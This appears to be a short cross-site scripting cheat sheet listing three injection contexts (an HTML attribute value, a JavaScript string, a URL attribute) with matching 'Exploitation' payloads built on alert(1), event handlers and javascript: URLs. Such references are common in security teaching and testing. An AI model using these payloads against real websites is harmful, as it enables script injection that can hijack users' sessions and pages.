- A tag attribute value :
 <input type"text" name="address1" value="test123">
- The Exploitation :
 <input type"text" name="address1" value="test123"> <script>alert(1)</script>">
 <input type"text" name="address1" value="test123" onfocus="alert(1)">

- A Javascript string :
 <script>var a = 'test123'; var b = 123; ... </script>
- The Exploitation :
 <script>var a = 'test123'; alert(1); var foo=''; var b = 123; ... </script>

- An Attribute Containing a URL :
 <a href="test123">Click here .. </a>
- The Exploitation :
 <a href="javascript:alert(1)">Click here .. </a>
 <a href="#" onclick="javascript:alert(1)">Click here .. </a>

